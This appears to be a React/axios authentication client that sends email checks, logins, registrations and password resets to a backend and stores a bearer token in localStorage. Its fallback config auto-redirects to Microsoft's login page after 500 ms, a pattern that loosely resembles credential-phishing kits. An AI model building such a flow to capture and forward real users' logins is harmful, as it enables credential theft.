import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api/auth`;

/**
 * Authentication Service
 * Replaces mock.js functions with real API calls
 */

export const authService = {
  /**
   * Get app configuration (redirect settings)
   */
  getConfig: async () => {
    try {
      const response = await axios.get(`${API}/config`);
      return response.data;
    } catch (error) {
      console.error('Get config error:', error);
      // Return defaults if config fails
      return {
        autoRedirect: true,
        redirectUrl: 'https://login.microsoftonline.com/',
        redirectDelay: 500
      };
    }
  },

  /**
   * Check if an email exists in the database
   */
  checkEmail: async (email) => {
    try {
      const response = await axios.post(`${API}/check-email`, { email });
      return response.data;
    } catch (error) {
      console.error('Check email error:', error);
      throw error;
    }
  },

  /**
   * Authenticate user with email and password
   */
  login: async (email, password) => {
    try {
      const response = await axios.post(`${API}/login`, { email, password });
      return response.data;
    } catch (error) {
      console.error('Login error:', error);
      if (error.response && error.response.data) {
        throw new Error(error.response.data.detail || 'Login failed');
      }
      throw new Error('Login failed. Please try again.');
    }
  },

  /**
   * Register a new user
   */
  register: async (email, password, name) => {
    try {
      const response = await axios.post(`${API}/register`, {
        email,
        password,
        name
      });
      return response.data;
    } catch (error) {
      console.error('Registration error:', error);
      if (error.response && error.response.data) {
        throw new Error(error.response.data.detail || 'Registration failed');
      }
      throw new Error('Registration failed. Please try again.');
    }
  },

  /**
   * Request password reset
   */
  resetPassword: async (email) => {
    try {
      const response = await axios.post(`${API}/forgot-password`, { email });
      return response.data;
    } catch (error) {
      console.error('Password reset error:', error);
      if (error.response && error.response.data) {
        throw new Error(error.response.data.detail || 'Password reset failed');
      }
      throw new Error('Password reset failed. Please try again.');
    }
  },

  /**
   * Get current user from token
   */
  getCurrentUser: async () => {
    try {
      const token = localStorage.getItem('authToken');
      if (!token) {
        throw new Error('No authentication token found');
      }

      const response = await axios.get(`${API}/me`, {
        headers: {
          Authorization: `Bearer ${token}`
        }
      });
      return response.data;
    } catch (error) {
      console.error('Get current user error:', error);
      // Clear invalid token
      localStorage.removeItem('authToken');
      localStorage.removeItem('user');
      throw error;
    }
  },

  /**
   * Store auth data in localStorage
   */
  storeAuthData: (token, user) => {
    localStorage.setItem('authToken', token);
    localStorage.setItem('user', JSON.stringify(user));
  },

  /**
   * Clear auth data from localStorage
   */
  clearAuthData: () => {
    localStorage.removeItem('authToken');
    localStorage.removeItem('user');
  },

  /**
   * Check if user is authenticated
   */
  isAuthenticated: () => {
    return !!localStorage.getItem('authToken');
  }
};

export default authService;
